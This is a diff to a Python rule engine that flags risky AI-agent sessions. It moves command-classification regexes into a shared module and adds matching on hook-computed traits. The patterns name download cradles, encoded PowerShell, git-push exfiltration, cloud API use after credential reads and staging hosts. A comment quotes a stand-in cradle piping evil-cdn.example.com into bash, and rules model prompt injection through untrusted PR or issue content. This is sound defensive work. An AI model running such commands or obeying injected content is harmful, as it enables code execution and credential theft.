@@ -10,27 +10,37 @@ Add a rule by writing a function and appending it to REGISTRY.
 
 from __future__ import annotations
 
-import re
 from datetime import datetime, timezone
 from typing import Any
 
 from .models import Detection
+from .yaml_config import threshold as _threshold
 
-# A raw-IP URL and a download/execute verb in the same command is a classic
-# malware download cradle. Legit tooling uses domains and package managers.
-_RAW_IP_URL = re.compile(r"https?://((?:\d{1,3}\.){3}\d{1,3})")
-# Loopback is not ingress. Fetching your own orchestrator's health endpoint is
-# the most common command a developer runs while dogfooding this tool, and it
-# produced a critical "download cradle" on a plain status check. Same reasoning
-# as the egress exemption in core/audit/mitre.py; piping loopback content into
-# a shell still fires via _PIPE_TO_SHELL below.
-_LOOPBACK_IP = re.compile(r"^(?:127(?:\.\d{1,3}){3}|0\.0\.0\.0)$")
-_DOWNLOAD_EXEC = re.compile(
-    r"downloadstring|downloadfile|invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b|"
-    r"certutil|bitsadmin|invoke-expression|\biex\b",
-    re.IGNORECASE,
+# Command-classification regexes live in traits.py, shared with the hook client:
+# the hook computes `tool.traits` labels from the plaintext command before
+# hashing, so these rules can still match when the default privacy config keeps
+# `tool.command` out of the trail entirely. Historical rationale for each
+# pattern (loopback exemption, benign package managers, ...) is documented
+# there. Keep matching logic here in the `command regex OR trait` shape so both
+# logged-command and hashed-only events are covered.
+from .traits import (
+    BENIGN_AFTER_STAGING as _BENIGN_AFTER_STAGING,
+    CLOUD_API as _CLOUD_API,
+    DELETE_COMMAND as _DELETE_COMMAND,
+    DOWNLOAD_EXEC as _DOWNLOAD_EXEC,
+    ENCODED_CMD as _ENCODED_CMD,
+    GIT_EXFIL as _GIT_EXFIL,
+    LOOPBACK_IP as _LOOPBACK_IP,
+    PIPE_TO_SHELL as _PIPE_TO_SHELL,
+    PR_COMMIT_COMMAND as _PR_COMMIT_COMMAND,
+    PR_DESC_COMMAND as _PR_DESC_COMMAND,
+    PR_MERGE_COMMAND as _PR_MERGE_COMMAND,
+    RAW_IP_URL as _RAW_IP_URL,
+    RISKY_EXEC_AFTER_STAGING as _RISKY_EXEC_AFTER_STAGING,
+    STAGING_FETCH as _STAGING_FETCH,
+    STAGING_HOST as _STAGING_HOST,
+    UNTRUSTED_INPUT_COMMAND as _UNTRUSTED_INPUT_COMMAND,
 )
-_ENCODED_CMD = re.compile(r"-enc(odedcommand)?\b|frombase64string", re.IGNORECASE)
 
 # --- safe accessors ----------------------------------------------------------
 # Events are plain dicts read from JSONL; never assume a nested key exists.
@@ -155,11 +165,7 @@ def _to_tz(ts: str, tz: Any) -> datetime | None:
 
 # --- rules -------------------------------------------------------------------
 
-_DISCOVERY_BURST = 3  # list_dir/glob calls that read as recon before a grab
-_DELETE_BURST = 5  # deletions in one session before it is worth a look
-_SUBAGENT_BURST = 5  # subagent spawns in one session (Kimi AgentSwarm, Qwen Agent Teams)
-_TOOL_BURST = 40  # successful tool calls in one session (HF-style agentic campaigns)
-_HOST_SUBAGENT_BURST = 8  # subagent starts across sessions on one host
+# Thresholds are tunable via policies/detection/manifest.yaml (reload on restart).
 
 # Exact tool methods that destroy data. Normalized via _norm_tool, so
 # `delete_file`, `deleteFile` and `Delete` all land here, while
@@ -168,26 +174,8 @@ _DELETE_METHODS = frozenset(
     {"delete", "deletefile", "removefile", "rm", "rmdir", "unlink", "rmrf", "destroy"}
 )
 
-# `bash: rm -rf build/` is a deletion even though the tool is named "Bash".
-_DELETE_COMMAND = re.compile(
-    r"\brm\s+(-[a-z]*\s+)*|\brmdir\b|\bunlink\b|remove-item\b|\bdel\s+/", re.IGNORECASE
-)
-
 # Scheduled work runs at night by design; excluded from the off-hours rule.
 _SCHEDULED_TRIGGERS = frozenset({"cron", "schedule", "scheduled", "timer"})
-
-# Fetch remote content and feed it straight to an interpreter. The classic
-# download cradle, and the payload shape in the ADI remote-code-execution chain
-# (arXiv:2607.05120 §4.2). Deliberately independent of _RAW_IP_URL: a real
-# attacker uses a domain, which reads as legitimate, so requiring a bare IP
-# missed `curl https://evil-cdn.example.com/x.sh | bash` entirely.
-_PIPE_TO_SHELL = re.compile(
-    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
-    r"(sudo\s+)?\b(ba|z|k|da)?sh\b|"
-    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
-    r"(iex|invoke-expression|python\d?|perl|ruby|node)\b",
-    re.IGNORECASE,
-)
 
 # Tools/commands that pull content an outsider can author. ADI's whole premise
 # is that this data is treated as trusted, so anything a session does *after*
@@ -195,15 +183,11 @@ _PIPE_TO_SHELL = re.compile(
 _UNTRUSTED_INPUT_METHODS = frozenset(
     {"webfetch", "websearch", "readissue", "readprdesc", "readprcommit", "readcomments", "browse"}
 )
-# Note the absence of a bare `curl https://...`. A curl is ambiguous: this engine
-# already models it as egress (TA0011), so counting it as ingestion too made it
-# both halves of this rule, and two ordinary web reads raised an alarm. Only
-# unambiguous content-ingestion vectors belong here.
-_UNTRUSTED_INPUT_COMMAND = re.compile(
-    r"\bgh\s+(issue|pr)\s+(view|list|diff|comment)|"
-    r"\bgit\s+(fetch|pull|clone)\b",
-    re.IGNORECASE,
-)
+# Note the absence of a bare `curl https://...` in UNTRUSTED_INPUT_COMMAND
+# (traits.py). A curl is ambiguous: this engine already models it as egress
+# (TA0011), so counting it as ingestion too made it both halves of this rule,
+# and two ordinary web reads raised an alarm. Only unambiguous content-ingestion
+# vectors belong there.
 
 # Techniques that make a post-ingestion action worth flagging. Plain execution
 # is excluded on purpose: "read the issue, then run the tests" is the single
@@ -217,56 +201,20 @@ _RISKY_TECHNIQUES = ("T1552", "T1485", "T1027", "T1105", "T1071")
 _PR_DESC_METHODS = frozenset({"readprdesc", "readpr", "prview"})
 _PR_COMMIT_METHODS = frozenset({"readprcommit", "prdiff", "readcommit", "prfiles"})
 _PR_MERGE_METHODS = frozenset({"mergepr", "prmerge", "merge"})
-_PR_DESC_COMMAND = re.compile(r"\bgh\s+pr\s+view\b", re.IGNORECASE)
-_PR_COMMIT_COMMAND = re.compile(r"\bgh\s+pr\s+(diff|checkout|files)\b|\bgit\s+show\b", re.IGNORECASE)
-_PR_MERGE_COMMAND = re.compile(r"\bgh\s+pr\s+merge\b|\bgit\s+merge\b", re.IGNORECASE)
 
-# Cloud and cluster APIs used after credential harvest (HF July 2026 lateral phase).
-# Require CLI invocation, not credential file paths like ~/.aws/credentials.
-_CLOUD_API = re.compile(
-    r"\bkubectl\b|"
-    r"(?:^|\s)aws\s+\w|"
-    r"\bgcloud\b|"
-    r"\baz\s+(?:account|login|keyvault|aks|storage)\b|"
-    r"\b(?:hf|huggingface-cli)\b|"
-    r"\baliyun\b|\btencentcloud\b|\bbce\b|\bossutil\b|\bcoscmd\b",
-    re.IGNORECASE,
-)
 
-# Push harvested material to a remote the operator did not intend (Nx s1ngularity class).
-_GIT_EXFIL = re.compile(
-    r"\bgit\s+push\b|"
-    r"\bgh\s+repo\s+(?:create|sync)\b|"
-    r"\bgh\s+release\s+upload\b",
-    re.IGNORECASE,
-)
+def _traits(event: dict[str, Any]) -> frozenset[str]:
+    """Hook-side command classification labels (tool.traits), if present."""
+    tool = event.get("tool")
+    if isinstance(tool, dict):
+        raw = tool.get("traits")
+        if isinstance(raw, list):
+            return frozenset(str(t) for t in raw if t)
+    return frozenset()
 
-# Public staging hosts used for agent C2 (gist, HF raw files, GitHub raw content).
-_STAGING_HOST = re.compile(
-    r"https?://(?:[\w-]+\.)?(?:"
-    r"githubusercontent\.com|gist\.github\.com|raw\.github\.com|"
-    r"huggingface\.co|pastebin\.com|gitlab\.com|bitbucket\.org"
-    r")",
-    re.IGNORECASE,
-)
-_STAGING_FETCH = re.compile(
-    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b",
-    re.IGNORECASE,
-)
-# Second-step execution after a staged download — excludes package managers, which
-# legitimately follow fetching a manifest from GitHub.
-_RISKY_EXEC_AFTER_STAGING = re.compile(
-    r"\b(bash|sh|zsh|dash)\s+[\w./~-]+\.(?:sh|bash)\b|"
-    r"\bpython\d?\s+[\w./~-]+\.py\b|"
-    r"\bpython\d?\s+-c\b|"
-    r"\b(iex|invoke-expression|eval)\b|"
-    r"\bpowershell(?:\.exe)?\s+-(?:enc|f|file)\b",
-    re.IGNORECASE,
-)
-_BENIGN_AFTER_STAGING = re.compile(
-    r"\b(npm|yarn|pnpm|pip|pip3|cargo|go)\s+(?:install|run|build)\b",
-    re.IGNORECASE,
-)
+
+def _has_trait(event: dict[str, Any], name: str) -> bool:
+    return name in _traits(event)
 
 
 def _is_credential_access(event: dict[str, Any]) -> bool:
@@ -275,16 +223,20 @@ def _is_credential_access(event: dict[str, Any]) -> bool:
 
 def _is_staging_fetch(event: dict[str, Any]) -> bool:
     cmd = _command(event)
-    if not cmd or not _STAGING_HOST.search(cmd):
-        return False
-    return bool(_STAGING_FETCH.search(cmd) or _DOWNLOAD_EXEC.search(cmd))
+    if cmd:
+        if not _STAGING_HOST.search(cmd):
+            return False
+        return bool(_STAGING_FETCH.search(cmd) or _DOWNLOAD_EXEC.search(cmd))
+    return _has_trait(event, "staging_fetch")
 
 
 def _is_risky_exec_after_staging(event: dict[str, Any]) -> bool:
     if _action_type(event) != "tool_called" or _outcome(event) != "success":
         return False
     cmd = _command(event)
-    if not cmd or _BENIGN_AFTER_STAGING.search(cmd):
+    if not cmd:
+        return _has_trait(event, "risky_exec")
+    if _BENIGN_AFTER_STAGING.search(cmd):
         return False
     if _PIPE_TO_SHELL.search(cmd):
         return True
@@ -383,7 +335,7 @@ def rule_discovery_then_collect(events: list[dict[str, Any]]) -> list[Detection]
         tactic = _tactic_id(event)
         if tactic == "TA0007":
             burst.append(event)
-        elif tactic in ("TA0009", "TA0006") and len(burst) >= _DISCOVERY_BURST:
+        elif tactic in ("TA0009", "TA0006") and len(burst) >= _threshold("discovery_burst"):
             collect = event
             technique_ids = sorted({_technique_id(e) for e in burst if _technique_id(e)})
             if _technique_id(collect):
@@ -499,16 +451,20 @@ def rule_encoded_command_download(events: list[dict[str, Any]]) -> list[Detectio
     """
     for event in events:
         cmd = _command(event)
-        if not cmd:
-            continue
-        remote_ips = [ip for ip in _RAW_IP_URL.findall(cmd) if not _LOOPBACK_IP.match(ip)]
-        raw_ip_fetch = bool(remote_ips and _DOWNLOAD_EXEC.search(cmd))
-        # Piping a fetch into an interpreter is a cradle whatever the host is.
-        # Requiring a bare IP let `curl https://evil-cdn.example.com/x.sh | bash`
-        # straight through, which is what a real attacker actually uses.
-        piped = bool(_PIPE_TO_SHELL.search(cmd))
-        if raw_ip_fetch or piped:
+        if cmd:
+            remote_ips = [ip for ip in _RAW_IP_URL.findall(cmd) if not _LOOPBACK_IP.match(ip)]
+            raw_ip_fetch = bool(remote_ips and _DOWNLOAD_EXEC.search(cmd))
+            # Piping a fetch into an interpreter is a cradle whatever the host is.
+            # Requiring a bare IP let `curl https://evil-cdn.example.com/x.sh | bash`
+            # straight through, which is what a real attacker actually uses.
+            piped = bool(_PIPE_TO_SHELL.search(cmd))
             encoded = bool(_ENCODED_CMD.search(cmd))
+        else:
+            # Default privacy config: no command text — match hook-side labels.
+            raw_ip_fetch = _has_trait(event, "raw_ip_fetch")
+            piped = _has_trait(event, "pipe_to_shell")
+            encoded = _has_trait(event, "encoded_cmd")
+        if raw_ip_fetch or piped:
             techniques = ["T1105", "T1059.001"]  # Ingress Tool Transfer, PowerShell
             if encoded:
                 techniques.append("T1027")  # Obfuscated Files or Information
@@ -559,7 +515,9 @@ def _is_delete(event: dict[str, Any]) -> bool:
     method = _norm_tool(_tool_qualified(event).rsplit(".", 1)[-1])
     if method in _DELETE_METHODS:
         return True
-    return bool(_DELETE_COMMAND.search(_command(event)))
+    if _DELETE_COMMAND.search(_command(event)):
+        return True
+    return _has_trait(event, "delete_cmd")
 
 
 def rule_destructive_delete_burst(events: list[dict[str, Any]]) -> list[Detection]:
@@ -575,7 +533,7 @@ def rule_destructive_delete_burst(events: list[dict[str, Any]]) -> list[Detectio
         for e in events
         if _action_type(e) == "tool_called" and _outcome(e) == "success" and _is_delete(e)
     ]
-    if len(deletes) < _DELETE_BURST:
+    if len(deletes) < _threshold("delete_burst"):
         return []
     return [
         Detection(
@@ -670,7 +628,9 @@ def _is_untrusted_input(event: dict[str, Any]) -> bool:
     """Did this event pull content an outsider could have authored?"""
     if _method(event) in _UNTRUSTED_INPUT_METHODS:
         return True
-    return bool(_UNTRUSTED_INPUT_COMMAND.search(_command(event)))
+    if _UNTRUSTED_INPUT_COMMAND.search(_command(event)):
+        return True
+    return _has_trait(event, "untrusted_input")
 
 
 def _is_risky(event: dict[str, Any]) -> bool:
@@ -755,13 +715,17 @@ def rule_pr_merged_without_review(events: list[dict[str, Any]]) -> list[Detectio
             continue
         method, cmd = _method(event), _command(event)
 
-        if method in _PR_DESC_METHODS or _PR_DESC_COMMAND.search(cmd):
+        if method in _PR_DESC_METHODS or _PR_DESC_COMMAND.search(cmd) or _has_trait(event, "pr_desc"):
             saw_pr = True
-        if method in _PR_COMMIT_METHODS or _PR_COMMIT_COMMAND.search(cmd):
+        if method in _PR_COMMIT_METHODS or _PR_COMMIT_COMMAND.search(cmd) or _has_trait(event, "pr_commit"):
             reviewed = True
             continue
 
-        merging = method in _PR_MERGE_METHODS or _PR_MERGE_COMMAND.search(cmd)
+        merging = (
+            method in _PR_MERGE_METHODS
+            or _PR_MERGE_COMMAND.search(cmd)
+            or _has_trait(event, "pr_merge")
+        )
         if merging and saw_pr and not reviewed and _outcome(event) == "success":
             return [
                 Detection(
@@ -798,7 +762,7 @@ def rule_credential_read_then_cloud_api(events: list[dict[str, Any]]) -> list[De
     for event in events[cred_idx + 1:]:
         if _action_type(event) != "tool_called" or _outcome(event) != "success":
             continue
-        if not _CLOUD_API.search(_command(event)):
+        if not (_CLOUD_API.search(_command(event)) or _has_trait(event, "cloud_api")):
             continue
         cred = events[cred_idx]
         return [
@@ -836,7 +800,7 @@ def rule_dotfile_read_then_git_push(events: list[dict[str, Any]]) -> list[Detect
     for event in events[cred_idx + 1:]:
         if _action_type(event) != "tool_called" or _outcome(event) != "success":
             continue
-        if not _GIT_EXFIL.search(_command(event)):
+        if not (_GIT_EXFIL.search(_command(event)) or _has_trait(event, "git_exfil")):
             continue
         cred = events[cred_idx]
         return [
@@ -916,7 +880,7 @@ def rule_subagent_swarm_burst(events: list[dict[str, Any]]) -> list[Detection]:
     disclosure (many short-lived workers in one campaign).
     """
     starts = [e for e in events if _is_subagent_start(e)]
-    if len(starts) < _SUBAGENT_BURST:
+    if len(starts) < _threshold("subagent_burst"):
         return []
     return [
         Detection(
@@ -950,7 +914,7 @@ def rule_session_tool_burst(events: list[dict[str, Any]]) -> list[Detection]:
         for e in events
         if _action_type(e) == "tool_called" and _outcome(e) == "success"
     ]
-    if len(tools) < _TOOL_BURST:
+    if len(tools) < _threshold("session_tool_burst"):
         return []
     return [
         Detection(
@@ -987,7 +951,7 @@ def rule_host_subagent_swarm_burst(events: list[dict[str, Any]]) -> list[Detecti
     session stays under the per-session threshold.
     """
     starts = [e for e in events if _is_subagent_start(e)]
-    if len(starts) < _HOST_SUBAGENT_BURST:
+    if len(starts) < _threshold("host_subagent_burst"):
         return []
     host = _host_id(events)
     sessions = sorted({str(e.get("correlation_id") or "") for e in starts if e.get("correlation_id")})
